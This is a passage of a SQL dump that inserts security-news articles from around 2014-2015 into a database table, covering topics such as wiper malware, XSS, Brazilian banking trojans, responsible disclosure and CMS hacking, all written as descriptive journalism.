it from happening again. It is crucial that we can tell them this quickly and confidently.\n Cybersecurity needs to become   to everyone, not just a few people. Everyone should know what is secure, what isn’t and what needs to be. Just like being aware of real-life burglars, everyone needs to think like a cybercriminal. Just like we are inherently cautious of strangers offering services at our front door, we need to be equally wary of emails and social connections. Instilling this culture will take time, but it can be helped through constant reminders and targeted training of those in high-value positions and those who are a bit loose with their URL clicking, Web browsing and third-party application downloads and use.\n We could go on and draw more parallels between   and other areas that deal with defense. For example, another favorite analogy of mine is our body’s immune system, as described by  . I find that this approach can really give a different perspective and help us clearly see that forest in one of the most challenging, dynamic and all-consuming business and personal issues today.', '\'Cybercrime\', \'Cybersecurity\', \'Physical Security\', \'Security Intelligence\'', 'https://securityintelligence.com/how-physical-security-defenses-influence-cybersecurity/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (471, 'Wiper Malware Poses Destructive Threat', 'Rick M Robinson', '2015-1-21', 'Wiper malware — so called because it erases data from victims’ computer drives — played a key part in the costly cybersecurity breach directed against   in late 2014. It is also a demonstration of the murky netherworld in which the distinctions among cyberwar, cyberterrorism and cybercrime can be difficult to draw. The use of this type of malware so far has been largely associated with   hacktivists, while some of the victims have been potential targets of intelligence activity directed at or supported by nation-state intelligence organizations. As David McMillen reports in an IBM MSS research paper, “ ,” such malware has been associated with attacks going back to 2008. At that time, a malware called Narilam was deployed specifically against financial and business software packages that are primarily used in Iran. In 2009 and 2010, another pair of packages including Wiper malware, Dozer and Koredos were deployed against victims in South Korea. In 2012, a Wiper package called Shamoon was used to cripple 30,000 computers at Saudi Aramco, while a different package, called GrooveMonitor/Maya, was reported in Iran. In 2013, a package called Dark Seoul was deployed against victims in South Korea. The most recent attack against Sony, which has been associated with North Korea, employed a Wiper software dubbed Destover. The sophistication of the attack and the scope of the damage done vary widely among these Wiper malware variants. Some launch a one-time attack on a specific date and erase hard drives, while others gradually corrupt disks over a long period, during which interval they communicate with a remote command-and-control center. It has been challenging to analyze the Wiper malware because the data erasure commanded by the malware includes eliminating the object image of the malware itself. Because Wiper destroys data instead of stealing it, its use so far has been primarily associated with politically motivated attacks, whether launched by freelancing ideological hacktivists or by state intelligence operatives. However, attackers can also use the threat of data erasure or exposure as a means of extortion. The scope of the Wiper malware threat may thus extend from intelligence-related activity to cybercrime motivated by a hope of financial gain. Wiper   can be extremely destructive, as its role in the Sony attack has already demonstrated. As such, purely defensive tactics are insufficient. Firms and other organizations must take proactive security steps to minimize the risks from the Wiper malware. Crucial intellectual property should be isolated in hardened systems that can be accessed only through privileged connections. Important data should be backed up off-site, and organizations must institute and test an emergency response and recovery plan. These measures will not provide immunity, but they will make firms better prepared to respond to the threat of Wiper malware.', '\'Cyberattack\', \'Cybersecurity\', \'Malware\', \'Sony Pictures\', \'Wiper Malware\'', 'https://securityintelligence.com/wiper-malware-poses-destructive-threat/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (472, '‘Blackhat’: Hollywood’s Latest Take on Hacking', 'Pamela Cobb', '2015-1-21', 'I like to think I’m uniquely qualified to review the movie “Blackhat” due to a blend of experience involving an Excellence Award in eighth-grade shop class, hands-on training running a power plant at a previous job and an affiliation with  . I generally enjoy an excuse to sit in a dark theater, eat popcorn and be entertained. I went into the movie having read an article that stressed the technical accuracy that director Michael Mann was pursuing for the film, engaging an   to create plausible hacking scenarios. And that’s the best word to describe this movie: plausible. As we dive into the different scenarios, bear in mind that there will be spoilers. The opening attack scenario involves the remote compromise of the programmable logic controller on a cooling pump in a nuclear plant near Hong Kong, which masks the actual performance of the equipment, ultimately causing a cooling failure and reactor meltdown. The exploit is launched via an “elegantly” coded piece of software adapted from a remote access tool (RAT) developed by the main characters. The payload downloaded by the RAT was obviously from a different developer because that coding style was “frenetic” when compared to the RAT. Having just written about a 2014 attack on a  , which hearkened back to Stuxnet in 2010, I found this SCADA exploit absolutely believable. Reusing and adapting code is a familiar practice for attackers, and investigations frequently compare samples to identify common attack vectors. A good bit of what the movie gets right is the   scenarios. In one example, a recently hired employee is found to have not been what he represented himself to be, mysteriously going on leave shortly after accessing sensitive data. In another, a woman assists in gaining access to banking records by asking a security guard at the front desk of the bank to print a new copy of a report she needs for a meeting. Little does the guard know, the USB drive she hands him with the report is loaded with a bit of malware that lets the remote cybercriminal infiltrate the bank’s network. I think my favorite example was a bit of spear phishing done by the team to gain access to a National Security Agency system. After getting shot down through official channels to use the system, the team spoofs an email from the manager of the employee that turned them down. This tricks the employee into opening a PDF file (appropriately named “password policies”) that contains a keylogger, letting the team identify the employee’s own login and password. These are all eminently believable scenarios that play out in the real world. I suppose everyone should work on   to check email headers and not accept USB drives from strangers. One of the most frustrating things about any hacking scenario in a movie or television show is the reliance on firewall technology to protect the enterprise. Firewalls have come a long way, but they are by no means sufficient to protect an entire enterprise network, which can include endpoints, data centers and Web applications. The nuclear plant in question was described as being “massively firewalled,” which is not even a real thing. There are massively scalable firewalls, but multiple firewalls (or putting firewalls really close together in the data center) don’t add all that much protection since bad firewall management policies in the first firewall tend to be repeated on subsequent firewalls. “Blackhat” redeems itself for this misstep, though, since the network is also described as using intrusion prevention and deep-packet inspection. I offer kudos to the producers for getting up to speed on newer security technologies, although they did not reference a   to bring it all together. A later protection strategy showed a small piece of hardware that generates a one-time password, but it is portrayed as a fingerprint scanner. Its use instilled a character with such confidence that he said his fingerprint was his only password. That would be a great line if biometrics were sufficient in and of themselves; however, there are plenty of examples of researchers  . Still, it’s a small nitpick among otherwise accurate scenarios. “Blackhat” gets a lot of the security technology and practice right. When the tech trail runs out, they follow the money, allowing the two streams of clues to complement each other. Where the movie takes technology liberties, they are relatively small. Even still, the bad guys have trouble hitting the broad side of a barn (demonstrating conservation of the Principle of Evil Marksmanship, even in a movie that strives for accuracy), duct tape is used in the ultimate confrontation and the main characters still take the time for a little hanky-panky in the midst of a nuclear meltdown and looming financial panic. Also, I’ve not known a lot of security analysts who had to issue a beatdown in a restaurant as part of an investigation. Personally, it was the story elements such as the romance and shootouts that took me out of the realism of the cyberattack scenario, and adherence to technical accuracy was at the expense of pacing and storytelling. It made for an accurate, yet relatively boring movie that would have been better watched at 1.2x speed. Image Source:', '\'Social Engineering\', \'Spear Phishing\'', 'https://securityintelligence.com/blackhat-hollywoods-latest-take-on-hacking/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (473, 'Cross-Site Scripting Attacks Pose Ongoing Threat', 'Rick M Robinson', '2015-1-19', 'Cross-site scripting (XSS) is a type of attack in which a user’s Web browser is tricked into regarding a “script,” or block of computer code, as coming from a trusted website when it has actually been slipped in from a malicious source. The malicious script can do anything from letting the attacker view paid content without payment to stealing innocent users’ personal identification or financial credentials. XSS attacks pose a threat not only to individual users whose browsers are misled, but also to companies and other organizations whose websites may be infected, letting attackers steal confidential customer information. For companies, this can mean both direct costs and damaging blows to their reputation. As with other security threats, there is no “magic bullet” to protect against XSS attacks. However, by adopting   and carefully reviewing website code, firms can protect themselves and their customers against these types of attacks. As noted by Nikita Gupta in a recent   research paper, the origin of XSS attacks goes back to the early days of the Web, when the JavaScript language was introduced in 1995. This language provided Web designers with many useful tools, but it also made XSS possible. Cybercriminals discovered that code scripts disguised as ordinary text could be slipped into a website, which would then execute the unintended — and often malicious — script. Vulnerability to XSS is not limited to JavaScript, however; other widely used Web design tools can also be exploited to allow for XSS attacks. Today, these attacks can take three basic forms. Reflected XSS, in which the malicious script comes from an external Web page, is the first iteration to which the name “cross-site scripting” was applied. It is also called nonpersistent XSS. However, the malicious script can also be stored in a server or database, in which case it is executed every time the page is displayed. Therefore, stored XSS is persistent. Finally, Document Object Model (DOM) scripting is done by modifying the DOM environment of the end-user victim’s browser, bypassing the Web server. The peak incidence of reported XSS attacks was in 2013. The trend last year significantly plummeted as companies beefed up their defenses, and 2014 saw the lowest level of XSS activity since 2011. It remains to be seen what 2015 will bring, but vulnerability to XSS remains widespread. According to the Hosted Application Scanning Management team at IBM, 17 percent of some 900 dynamic Web application scans showed a vulnerability to XSS. However, this data came from organizations with the most robust and mature security practices. A study by White Hat Security finds that nearly half of all sites (47.9 percent) are vulnerable to XSS attacks. The first line of defense against XSS is sanitizing input to a website to ensure malicious scripts are not disguised as ordinary text or in other forms. Website code should also be thoroughly reviewed, with special attention paid to places where input can be converted into HTML Web page output. Additionally,   “signatures” can and should be enabled (they are not always enabled by default), and the events generated by them should be monitored. Individual users can also protect themselves. For example, they can type Web URLs into their browser instead of simply clicking on links. XSS is not going away anytime soon, but   can help keep XSS attacks on a downward trend.', '\'Cross-Site Scripting (XSS)\', \'JavaScript\', \'Malicious Code\'', 'https://securityintelligence.com/cross-site-scripting-attacks-pose-ongoing-threat/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (474, 'Do You Trust Your Browser? Fake Browser Fraud Schemes Discovered in Brazil', 'Tal Darsan', '2015-1-19', 'IBM Trusteer’s Threat and Intelligence Group recently uncovered a Delphi source code for a popular attack vector in the Brazilian cybercrime threat landscape: the fake browser. This malicious type of software mimics the look and feel of a legitimate browser to steal login credentials from unsuspecting banking customers and is used in Latin America and  , in particular. IBM Trusteer’s analysis provides a detailed under-the-hood view of the mechanics of fake browsers and how they operate. In the example below, the fake browser is being offered for sale on the Brazilian underground for 700 Brazilian real. The post reads, “SUP GUYS I WILL LEAVE HERE A KL BANKER WRITTEN IN DELPHI XE3, I HAVE KL PROXY FOR SALE 100% functional on my skype.” The victim is infected by a small downloader, typically when he or she opens an email or clicks on a link that contains  . The downloader drops a larger payload, which installs the fake browser. When the user browses to a targeted banking website, the Trojan will invoke a fake browser that mimics a legitimate browser. The fake browser displays a pop-up dialog that asks the user for his or her bank’s login credentials. Meanwhile, the user is blocked from carrying out other activities on the operating system, such as minimizing, expanding, moving or even closing the fake browser window. Also, the fake browser does not let victims access other websites. The effects are similar to that of ransomware: Victims are prevented from leaving the fake browser and are forced to finish the fake login process. After the fake login is completed, the victim’s credentials are sent to the cybercriminal’s command-and-control server or a predefined fraudulent email account. The credentials are later used to take over the victim’s account. The source code is highly customizable and offers the following settings: \n Since the source code is available in the Brazilian underground community, the cybercriminals can easily customize a Trojan payload name, email accounts and the desired targets within the code itself (Figure 3). In comparison, malware authors in other territories operate by selling a builder application for the generated malware. Figure 4 demonstrates the source code for the fake browser and exposes how the attack is executed: First, the malware obtains a Handle to the active windows using the   function. The malware then obtains the window title using   Finally, it compares the current window title with the list of variables containing targeted banks (Figure 3) with its own implementation of the function  . If the function’s result does not equal zero, it will enable the fake browser session. Basically, the malware uses Delphi code functions to initiate the fake browser attack by a given title of an active window. In the example below, the window title would be “IBM — United States — Windows Internet Explorer.” This malware demonstrates the ability to overcome another protection used by some banking sites where the browser’s title is obfuscated with random characters. An example of an obfuscated window title can be seen in the HTML snippets below: \n Over the years, IBM has seen fake browser malware being used to target Brazilian banks. These fake browsers imitate authentic Web browsers using the   project. These types of fake browsers typically implement browser functionalities and controls, as opposed to this variant, which doesn’t implement browser capabilities, only the graphical interface of a browser. Vigilant victims may understand they are not using their own Web browser because it may look slightly different from their original Web browser. Likewise, they will be blocked from performing any activities on their operating systems, as previously mentioned. \n Interestingly, the malware authors added a fake padlock layout, an icon used by Web browsers when notifying users that a website is using an SSL certificate. This may even trick advanced users who are attempting to confirm the reliability of their fake session. IBM Trusteer also noticed that the malicious code uses multiple validations of the fields that are targeted during the attack. The fact that nonworking or fake credentials fail the validation process may raise the credibility of the attack. Figure 9 shows how the malicious code validates the user’s  , a unique number used in Brazil to identify a person for tax purposes. In the event the CPF is false, a message box will alert victims that their CPF number is invalid. After the validation process ends, the stolen data is relayed to the cybercriminal. In this case, the malware was designed to forward the stolen data to a fraudulent email account. \n To ensure a successful account takeover, the fake browser requests additional information that may help the cybercriminal if he or she is faced with authentication challenges by the bank. The fake browser may ask for two-factor authentication information, such as the following: \n In another example of a fake browser, the malware utilizes social engineering as a means to fool the victim into giving up his or her credit card information. It does so by presenting a message to the user claiming the bank is updating its clients’ security cards and, therefore, requires its users to submit their credit card information in order to activate the “new security update.” The information requested from the user includes a credit card number, expiration date, CVV, debit card password and credit card password. IBM Trusteer can deduce from its research that in addition to using general malware to perform credentials theft, Brazilian fraud actors have found a niche in developing fraud schemes through social engineering. This puts online banking customers who lack security solutions at risk. IBM Trusteer researchers are closely monitoring this attack vector while providing appropriate protections against this type of financial malware and many others.', '\'Brazil\', \'Credit Card Fraud\', \'Fake Browser\', \'Fraud\', \'IBM Security Trusteer\', \'Malware\', \'Social Engineering\', \'Trusteer\'', 'https://securityintelligence.com/do-you-trust-your-browser-fake-browser-fraud-schemes-discovered-in-brazil/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (475, 'Remote Overlay Virtual Mugging Toolkit Targeting Brazilian Online Banks Discovered by IBM Trusteer', 'Ori Bach', '2015-1-13', 'In December 2014, IBM Security Trusteer researchers discovered a previously unpublished remote overlay toolkit called KL-Remote. This toolkit performs a “virtual mugging” by remotely taking over infected computers and executing fraudulent transactions from an end user’s computer without his or her knowledge. The toolkit provides criminals a user-friendly graphical user interface (GUI) to perform remote overlay attacks. In a remote overlay attack, criminals “overlay” fake messages on top of a legitimate website in order to trick users into divulging sensitive data. The KL-Remote toolkit is offered for sale in the Brazilian cybercrime world as a platform that can be embedded in the most common banking malware variants. The KL-Remote tool lets criminals steal banking credentials and then take over accounts directly from the infected computer. Attacks using the KL-Remote tool are unique because they involve manual intervention from the criminal during various stages of the fraud event. In fact, during a remote overlay attack, the criminal is virtually looking over the victim’s shoulder, watching his or her every move. At some point, the attacker takes direct control over the device without the victim’s knowledge. Brazil holds the dubious record of having the largest number of users attacked by banking malware. According to Serasa Experian, fraud against Brazilian customers totaled R$2.3 billion ($1.013 billion) in 2013, R$600 million ($264 million) of which was Internet banking fraud. According to a   on the country’s digital underworld, the Brazilian cybercrime community has schools offering cybercrime training programs. One of the most sought-after types of training is how to perpetrate bank fraud. Cybercriminal wannabes learn the fraud essentials, then progress to technical training on using fraud tools such as KL-Remote. The Brazilian cybercrime world is also unique in its frequent use of attack methods that require manual intervention by the criminal in various stages of the fraud event. Trusteer researcher Itsik Avigdol has conducted extensive analysis of the KL-Remote toolkit. He has created a step-by-step demonstration of the toolkit’s attack vector, showing both the victim’s side and the criminal’s control panel. The demonstration begins at a point where KL-Remote has been installed on a victim’s computer (typically done via a malware infection). All options and messages shown below are part of the tool’s default configuration. The original messages and screen GUI are in Portuguese and have been translated into English for reading convenience. The KL-Remote toolkit has a list of predefined targeted bank URLs. Once a user of an infected computer navigates to a targeted online banking website, the malware operator is alerted. The alert includes details on the infected computer, such as its operating system, processor and IP address. The toolkit operator can open a banking fraud panel that allows actions needed to steal credentials and take over accounts, as seen below: The toolkit takes a snapshot of the original website the victim was viewing and presents it as an image on the screen of the infected computer. From that point on, the victim cannot interact with the legitimate banking website (such as closing it or trying to proceed with a standard login). By pushing the “Start phishing” button, the criminal causes a message to appear on the victim’s screen. The tool contains separate messages for each of the targeted banks. Each message is customized to the bank’s website login/authentication process and copies its look and feel. After clicking the “Update” button, the victim is presented with the following, which is not part of the original bank website: After the victim has surrendered his or her credentials, he or she is presented with a waiting message, as seen below: As the victim is presented with the security update message, the criminal takes direct control over the infected computer’s mouse and keyboard and logs in to the banking website. The fraud activity is performed behind the overlay message of the website. The victim will not see the fraud activity or mouse movement, only a static picture of the bank’s website. The underlying assumption behind many traditional fraud detection tools is that fraudulent access will be done from a criminal’s device, not from the victim’s own computer. The KL-Remote toolkit’s approach of directly performing the attack from the victim’s computer is able to bypass traditional protection methods. IBM Trusteer’s analysis has shown that the toolkit is able to circumvent or compromise the following security measures: In order to prevent the overlay attacks, endpoint protection must be able to prevent the remote access tool from being installed (by detecting and preventing the malware infection) and prevent the browsing of a banking website from a remote-controlled computer. As part of IBM Trusteer’s analysis, the KL-Remote tool was tested against  , its own endpoint protection solution. Rapport’s dedicated endpoint protection against financial malware can identify unique malware attributes and prevent it from being installed. Additionally, Rapport can prevent browsing to banking websites via a remote access tool. IBM Trusteer’s tests showed that the KL-Remote toolkit was unable to perform account takeovers of endpoints protected by Rapport. The key to accurately detecting remote overlay attacks on the server side lies in gathering evidence on the full life cycle of the fraud event, such as the following: As part of IBM Trusteer’s analysis of the toolkit, it conducted tests by simulating attacks with the KL-Remote tool against sites protected with  . As a solution that deploys advanced sensors to collect evidence on the full life cycle of fraud, the Pinpoint Criminal Detection solution successfully detected attacks using the KL-Remote tool, identifying unique attributes such as the use of a remote access tool to log in to the banking website. Toolkits such as KL-Remote — which package a preconfigured fraud flow in a user-friendly GUI — greatly expand the pool of people who can commit banking fraud. With the toolkit, a criminal with basic technical skills can perform high-end fraud attacks that can circumvent strong authentication. Furthermore, the ability to embed the toolkit in types of common malware greatly increases its availability and reach. The KL-Remote is currently only being used in  , and the preconfigured messages embedded in it are available only in Portuguese. However, IBM Trusteer’s analysis shows that it can be adapted to other languages, territories and industries. IBM recommends users and financial institutions take the following steps to protect themselves:', '\'Brazil\', \'Cybercrime\', \'Financial Fraud\', \'Fraud\', \'IBM Security Trusteer\', \'Online Banking Fraud\', \'Overlay Attack\', \'Trusteer\'', 'https://securityintelligence.com/remote-overlay-virtual-mugging-toolkit-targeting-brazilian-online-banking-discovered-by-ibm-trusteer/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (476, 'On the Passing of Michael Hamelin', 'Pamela Cobb', '2015-1-9', 'Over the holidays in December, I learned of the tragic passing of Michael Hamelin in an automobile accident in Texas. Although Michael left IBM last November to pursue the next step in his career, he touched many IBMers with his generosity and insight during his time as the lead X-Force security architect in the chief technology officer’s office.\n Michael joined IBM in March 2013, bringing with him nearly 20 years of security domain experience. Prior to IBM, he worked as a security engineer, intrusion analyst, network and security architect and chief security architect. He was a passionate security evangelist and practitioner and ran capture the flag hacking contests at events such as DEF CON.\n Michael had the soul of a teacher and the intellect of a genius. It was a staggering combination, and Michael was in his element whether he was in front of clients, developers or IBM executives. He was one of our go-to “faces of X-Force,” and my only complaint from working with Michael is that he shaved his goatee after Black Hat last year before I could capture it on video. At conferences, Michael seemed to be known by all and was highly respected for his insight and input. Fortunately, he had gravitas in the security industry regardless of whether he had a goatee.\n Michael spoke to innumerable customers on behalf of IBM, and every time I heard him speak, I learned something new. A conversation with him was never short of anecdotes or insights on the security industry, or even life in general. Whether training for a triathlon or protecting a customer network, he always had a smile and a bit of knowledge to share in the most patient way possible.\n Michael’s friend and colleague  , the director of sales at Tufin, said so much of this better than I ever could. Funeral services were held on Jan. 3. If you would like to honor his memory, the Hamelin family has requested you consider making a donation to the charity of your choice in his name.\n Rest well, Michael Hamelin. You will be sorely missed.\n Image Source:', '\'IBM X-Force Research\', \'X-Force\'', 'https://securityintelligence.com/on-the-passing-of-michael-hamelin/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (477, 'No Holiday Bonanza for Cybercriminals During 2014 Holiday Shopping Season', 'John Kuhn', '2015-1-5', 'Every year, retailers dedicate a tremendous amount of energy preparing to take advantage of the holiday shopping season that kicks off with Black Friday and Cyber Monday. They often institute an annual “ ” period to avoid affecting sales and technology performance with new technology or buggy patches. The reason is obvious: These are the two biggest shopping days of the year, according to  . With credit card numbers being shared through browsers, smartphones and tablets as well as in stores, it seems logical that cyberattackers would lurk behind the Christmas trees and big door-buster advertisements. Only this year, they didn’t. My colleague   and I conducted some research on behalf of the   team around November’s shopping bonanza and the full year of 2014. Contrary to what most would have expected, we found that the majority of cyberattackers actually scaled back their hacking efforts during   and Cyber Monday. When looking at the two-week period from Nov. 24 to Dec. 5, we found that the number of daily attacks dropped from 4,200 in 2013 to 3,043 in 2014. The number of breaches also decreased by more than 50 percent. As a result, only 72,000 records were compromised during this time frame in 2014, as compared to 4 million in the  . This decline could be the result of attackers taking the holiday off. After all, there were some really good deals to be had. On the other hand, it could also demonstrate the effect increased user education has had on consumers. People are more wary than ever and, as a result, are less apt to click on the dancing Santa in that holiday e-card. The more likely explanation is that cybercriminals know retailers are keeping an extra-close eye on their digital security systems during these peak shopping days. Despite this cyberthreat slowdown during the holiday shopping season, the   did emerge as the top industry targets for attackers in 2014. In the two years prior, manufacturing ranked first among the top five attacked industries, while the retail and wholesale industry ranked last. Looking at this two-week period, one might assume that the good guys are winning the cyberbattle. Not so fast! When reviewing all of 2014, we found that cyberattackers stole more than 61 million records from retailers — down from almost 73 million in 2013. The drop might be encouraging, but when the data was narrowed down to only incidents involving less than 10 million records, we identified a different trend. The number of retail records compromised in 2014 increased by more than 43 percent over 2013. What’s also interesting is that attackers succeeded despite launching fewer attacks: Since 2012, the number of breaches reported by retailers dropped by 50 percent. What this tells us is that cyberattackers are becoming increasingly sophisticated and efficient, achieving their ultimate goals through fewer attacks. Perhaps this success is the very reason they stayed offline during the holiday shopping season.', '\'Black Friday\', \'Cyber Monday\', \'E-commerce\', \'IBM Managed Security Services (MSS)\', \'Retail\', \'Retail Breach\'', 'https://securityintelligence.com/no-holiday-bonanza-for-cybercriminals-during-2014-holiday-shopping-season/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (478, 'What You Can Learn About IT Security From the Emerging World', 'Ryan Fanzone', '2014-12-29', 'An unfamiliar and challenging environment can be the ideal position to rethink effective strategies for success.\n I was privileged to spend a month in Africa with   working on a project to help local organizations capitalize on their business potential. It was a valuable partnership for the local region and the IBM team. Even five years later, I continue to work lessons from the program into my professional career in IT security. The lessons span beyond the project work down to the daily life experience; the intersection between the two provided great insight into effective skills for addressing challenges.\n For example, our dining needs depended on local restaurants, where it often took well over an hour to get a “simple” meal, and it was nearly impossible to get a drink refill while we waited. Initially, we tried to be more generous with our tipping, but that didn’t produce the desired results. Then, we stepped back and asked our local colleagues for guidance.\n It turns out that we were making two assumptions that undermined our goal. First, we assumed the menu reflected the available options — it didn’t. The local custom is to show what the restaurant would like to serve, but that didn’t necessarily mean it had the necessary ingredients.\n We also assumed that tips belonged to the server — they don’t. Once again foiled by our assumptions, we didn’t realize the tips went to the house and therefore had no influence on the server’s attention to us.\n In adapting, we learned to ask what could be made on any given evening before we ordered and tipped appropriately without expecting it to influence our service.\n The following are three principles from the Corporate Service Corps experience I apply every day as a security professional:\n When you are dealing with the complex challenges from the multitude of advanced threats targeting enterprises today, it is essential to deconstruct the threat activity into well-defined fundamental units.\n Do you understand the motivations of the bad actors targeting your enterprise? When looking at a potential or actual threat scenario, do you dissect each step of the attack sequence to understand the weaknesses exploited and the mitigation options? Or do you look at the  ?\n Arriving in a new geography with a minimal understanding of the culture, customs and business philosophies, I learned assumptions can be very counterproductive to progress, as demonstrated by our restaurant experience.\n What are the assumptions your security program is making? Are you expecting the threat actors to always use traditional ingress and egress points? This is not likely with the complexity of today’s interconnected business ecosystems and the  . Do you assume trust for your privileged users? Remember, these folks have the greatest permission to your most sensitive assets.\n I firmly believe that without a plan, you only succeed by luck. In the region of Africa I visited, many of the residents routinely carry three cell phones. The logic here is that at least one of the towers of the three primary mobile providers will have power at any given time. Electricity was the critical factor in determining mobile service availability, so the population established its own unique approach to high availability. Today’s threats are able to evade traditional defenses, and no single control or approach is going to sufficiently secure enterprise resources.\n Is your program ready for the patient, skilled and motivated attacker? Have you exercised contingency plans in your cybersecurity preparations? Threat actors have a multiphased mentality that requires new and more coordinated thinking by the IT security organization.\n Have you applied emerging world thinking into your IT security program? You might be surprised by the value and knowledge gained by looking at the challenges through a different lens.', '\'Data Protection\', \'IT Security\', \'Privileged Users\', \'Security Program\'', 'https://securityintelligence.com/what-you-can-learn-about-it-security-from-the-emerging-world/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (479, 'The Responsible Disclosure Policy: Safeguard or Cybercriminal Siren Song?', 'Douglas Bonderud', '2014-12-26', 'From   and   to  , this has been a banner year for software vulnerabilities. Despite their appearance on myriad devices across a host of industries and operating systems, these threats share a common thread: They’ve all been disclosed to the public. The ensuing security fallout has some experts wondering whether a responsible disclosure policy is really a safeguard or just another siren song for cybercriminals.\n So what exactly is a responsible disclosure policy? Simply put, it is the release of details surrounding IT security vulnerabilities after a certain amount of time has passed. How much time depends on who has the information and how serious the potential threat is.\n For example, the Community Emergency Response Team (CERT) Division of the Software Engineering Institute’s   is to disclose any vulnerability data it receives 45 days after the initial report has been filed, but it will make allowances for “threats of an especially serious nature.” CERT argues that while 45 days puts pressure on organizations to fix identified vulnerabilities, this is not an impossible timeline.\n What’s more, there are cases where the specter of eventual disclosure can motivate companies to patch exploits or design better code. Other agencies offer a 90-day window, while others offer no window at all, preferring “open disclosures” where any bug or vulnerability is released to the public immediately.\n The bottom line? There is a lot of room to move on the issue of what is “responsible” and no general agreement on the ideal release schedule.\n Which is the better course, releasing details immediately, or holding data long enough for companies to close up security holes? A responsible disclosure policy tends to take the ethical high ground. It is often seen as a way to keep amateur bug hunters from blackmailing large companies into paying for silence and to keep high-profile bugs behind doors until fixes can be found.\n For example, Heartbleed was discovered around March 21, according to  , but it was released to the public on April 7, prompting a firestorm of criticism about how the threat was handled, even though a patch had been developed. There have also been rumors that software companies unhappy with early disclosures have sought out IT professionals and had them fired or otherwise inconvenienced for damaging the brand’s good name. Ideally, responsible disclosures balance the need for freedom and privacy by providing enough time to correct issues while still keeping the public informed.\n As noted by  , however, there is another argument against this kind of  . Telling malicious actors which pieces of code are vulnerable is like giving robbers keys to the bank vault. The twist? These robbers never needed keys in the first place. Any cybercriminal determined to punch through network defenses has already learned about potential vulnerabilities and won’t be surprised by anything a disclosure report has to say. Keeping this information quiet only serves to spur on criminal acts, since very few IT security professionals even know what’s happening, let alone how to correct the problem.\n Taking the argument further, Wired references an Alfred Charles Hobbs book, “The Construction of Locks,” published in 1853. In it, Hobbs argues that discussing the insecurity of locks does nothing to encourage crime by “rogues” since they “are very keen in their profession and know already much more than we can teach them respecting their several kinds of roguery.” Replace “roguery” with “hacking” and locks with software, and the book is spot-on. Malicious actors aren’t waiting with bated breath for the next security disclosure — they’re already two steps ahead.\n The real sticking point for   is collaboration. A responsible disclosure gives companies time to fix software problems, but many don’t reach out to other agencies for help, preferring to keep code in-house and solve problems in isolation. In a world where large-scale cyberthreats and zero-day vulnerabilities are happening month after month to network after network, however, this kind of head-in-the-sand thinking simply no longer works. Scheduled disclosures provide a reasonable, ethical framework for tackling vulnerabilities, and working together shortens the time required.', '\'Community Emergency Response Team (CERT) Division\', \'Heartbleed\', \'Responsible Disclosure\', \'Shellshock\', \'Vulnerability\'', 'https://securityintelligence.com/the-responsible-disclosure-policy-safeguard-or-cybercriminal-siren-song/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (480, 'CMS Hacking: 2014 by the Numbers', 'Douglas Bonderud', '2014-12-19', 'This year was a banner year for content management system (CMS) hacking. All the big names, including WordPress, Drupal and Joomla, were targeted in 2014, resulting in thousands of breaches that opened back doors, uploaded Trojans and created large-scale botnets for denial-of-service attacks. The following are the big-number takeaways from these CMS vulnerabilities: While it’s tempting to relegate CMS as “also-rans” in the world of security breaches, there is real risk when content management platforms are hacked. High-profile breaches such as Target and Home Depot garnered attention due to the  , and rightly — many retailers use point-of-sale systems that aren’t properly secured. As noted by  , however, 75 percent of websites using a CMS are powered by popular platforms such as WordPress, Joomla and Drupal, all of which are built on open-source code, are free to use and are largely maintained by a passionate community of users. In other words, this is a huge market for cybercriminals — and since almost every bit of code they need to break down CMS walls is publicly available, it’s no surprise that they are popular targets. But  , really? In July, a flaw in MailPoet Newsletters allowed attackers to upload arbitrary PHP files to Web servers and take control of WordPress-based websites, according to  . The hack was used to compromise at least 50,000 websites, and while a newer version of the plugin fixed the problem, many users were unaware of any issues until it was too late. “The back door is very nasty and creates an admin user called 1001001,” said security researchers from Sucuri, noting that it “also injects a backdoor code to all theme/core files.” On Nov. 20, the official   site announced that any versions earlier than 3.9.2 required a patch to deal with cross-site scripting vulnerabilities. Almost 86 percent of the 75 million sites running WordPress were vulnerable, and although the CMS provider said there is no evidence any websites were compromised, it’s a hard pill to swallow considering that just a month earlier, 800,000 banking credentials were stolen using hacked WordPress sites, according to  . CMS Drupal, meanwhile, was hit by a bug in October, according to  . Twelve million websites were put at risk, and Drupal staff issued a prepared statement warning that if users didn’t take action within seven hours after the bug was discovered on Oct. 15, they should consider themselves compromised. Left unchecked, the bug allowed malicious users to create back doors and take control of websites. According to Mark Stockley of security firm Sophos, Drupal should not rely on users to patch their own system after these types of CMS hacking. “What Drupal badly needs but doesn’t have is an automatic updater that rolls out security updates by default,” he said. According to  , Joomla also came under fire this year when popular e-commerce plugin VirtueMart was hacked. More than 3.5 million websites use VirtueMart. When the plugin was compromised, malicious actors gained “super-admin” privileges. Anyone using versions prior to 2.6.10 were at risk, and for some companies, this meant going through the code line by line looking for problems, since they had large orders or other projects already in progress and plugin developers weren’t forthcoming with the exact code location. More recently,   reported that WordPress, Drupal and Joomla were equally vulnerable to a new packaged back door, CryptoPHP. Once installed, CryptoPHP could enable public key encryption for communication between a compromised server and a command-and-control (C&C) server, create manual back doors, remotely update the list of compromised servers and prevent takedowns of C&C servers via email communication. The takeaway from all this CMS hacking is that common platforms are ideal targets for malicious actors, especially when they’re provided for free and don’t offer the same kind of   as for-pay software. The numbers don’t lie — it was a banner year for CMS hacks, and companies should be ready for even more in 2015. Image Source:', '\'CMS Hack\', \'Content Management System (CMS)\', \'Drupal\', \'Joomla\', \'WordPress\'', 